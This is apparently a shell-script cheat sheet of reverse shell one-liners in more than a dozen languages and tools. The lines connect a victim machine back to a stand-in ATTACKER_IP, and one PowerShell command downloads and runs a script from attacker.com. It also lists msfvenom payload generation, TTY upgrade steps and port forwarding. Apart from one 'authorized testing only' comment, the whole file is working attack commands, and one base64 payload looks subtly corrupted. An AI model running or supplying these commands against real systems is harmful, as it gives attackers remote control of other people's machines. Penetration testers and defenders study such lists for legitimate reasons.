#!/bin/bash
# Reverse Shell One-Liners Collection
# For authorized security testing only

# ============================================
# BASH REVERSE SHELLS
# ============================================

# Basic bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Alternative bash
/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Bash with file descriptor
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT;sh <&196 >&196 2>&196

# Bash one-liner
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

# Bash with redirection
exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | /bin/sh >&5 2>&5

# ============================================
# PYTHON REVERSE SHELS
# ============================================

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 2 one-liner
python2 -c "import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 3 with readline
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

# Python with encoded payload
python -c "exec(__import__('base64').b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXRBRl9JTkVULHNvY2tldFNPQ0tTVFJFQU0pO3MuY29ubmVjdCgoIkFUVEFDS0VSX0lQIixQT1JUKSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oMSksMSk7b3MuZHVwMihzLmZpbGVubygyKSwyKTtzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk=")'

# ============================================
# PERL REVERSE SHELS
# ============================================

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Perl one-liner
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

# Perl reverse shell
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){system $_}'

# ============================================
# RUBY REVERSE SHELS
# ============================================

# Ruby
ruby -rsocket -e 'TCPSocket.open("ATTACKER_IP",PORT){|s|exec "/bin/sh -i <&1 >&1 2>&1"}'

# Ruby one-liner
ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Ruby with OpenSSL
ruby -rsocket -ropenssl -e 'TCPSocket.open("ATTACKER_IP",PORT){|s|exec "/bin/sh -i <&1 >&1 2>&1"}'

# ============================================
# PHP REVERSE SHELS
# ============================================

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP one-liner
php -r '$sock=fsockopen("ATTACKER_IP",PORT);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'

# PHP exec
php -r 'exec("/bin/bash -c bash -i > /dev/tcp/ATTACKER_IP/PORT 0>&1");'

# PHP system
php -r 'system("bash -c bash -i > /dev/tcp/ATTACKER_IP/PORT 0>&1");'

# PHP shell_exec
php -r 'shell_exec("bash -c bash -i > /dev/tcp/ATTACKER_IP/PORT 0>&1");'

# PHP passthru
php -r 'passthru("bash -c bash -i > /dev/tcp/ATTACKER_IP/PORT 0>&1");'

# ============================================
# JAVA REVERSE SHELS
# ============================================

# Java Runtime
java -cp . -Djava.rmi.server.hostname=ATTACKER_IP ReverseShell ATTACKER_IP PORT

# Java one-liner
java -jar /tmp/ReverseShell.jar ATTACKER_IP PORT

# ============================================
# GO REVERSE SHELS
# ============================================

# Go one-liner
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ATTACKER_IP:PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/shell.go && go run /tmp/shell.go

# ============================================
# NODE.JS REVERSE SHELS
# ============================================

# Node.js
node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(PORT,"ATTACKER_IP",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'

# Node.js one-liner
node -e "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\"')"

# ============================================
# LUA REVERSE SHELS
# ============================================

# Lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER_IP','PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');"

# Lua one-liner
lua5.1 -e 'loadstring("require(\"socket\");require(\"os\");t=socket.tcp();t:connect(\"ATTACKER_IP\",\"PORT\");os.execute(\"/bin/sh -i <&3 >&3 2>&3\")')()'

# ============================================
# NETCAT REVERSE SHELS
# ============================================

# Netcat
nc -e /bin/bash ATTACKER_IP PORT

# Netcat with mkfifo
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# Netcat without -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f

# Ncat
ncat ATTACKER_IP PORT -e /bin/sh

# Ncat with mkfifo
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|ncat ATTACKER_IP PORT >/tmp/f

# ============================================
# SOCAT REVERSE SHELS
# ============================================

# Socat (basic)
socat TCP-LISTEN:PORT FILE:`tty`,raw,echo=0

# Socat (full TTY)
socat file:`tty`,raw,echo=0 tcp:ATTACKER_IP:PORT

# Socat (encrypted)
socat OPENSSL-LISTEN:PORT,cert=server.pem,verify=0 FILE:`tty`,raw,echo=0

# Socat (one-liner)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT

# ============================================
# POWERSHELL REVERSE SHELS
# ============================================

# PowerShell (basic)
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PowerShell (encoded)
powershell -e <base64-encoded-reverse-shell>

# PowerShell download and execute
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"

# ============================================
# BOURNE SHELL REVERSE SHELS
# ============================================

# sh
sh -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# ash
ash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# ksh
ksh -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

# zsh
zsh -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

# ============================================
# C REVERSE SHELL
# ============================================

# Compile and run
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>

int main() {
    int sock;
    struct sockaddr_in server;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_addr.s_addr = inet_addr("ATTACKER_IP");
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    connect(sock, (struct sockaddr *)&server, sizeof(server));
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execl("/bin/sh", "sh", NULL);
    return 0;
}
EOF
gcc /tmp/shell.c -o /tmp/shell && /tmp/shell

# ============================================
# USEFUL ONELINERS
# ============================================

# Start listener
nc -lvp PORT

# Generate payloads
msfvenom -p linux/x86/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell.elf
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=PORT -f raw -o shell.php

# TTY upgrade
python -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo
fg
export TERM=xterm
export SHELL=/bin/bash
stty rows 48 columns 120

# Port forwarding
socat TCP-LISTEN:LOCAL_PORT,fork TCP:REMOTE_IP:REMOTE_PORT
ssh -L LOCAL_PORT:REMOTE_IP:REMOTE_PORT user@jumpbox
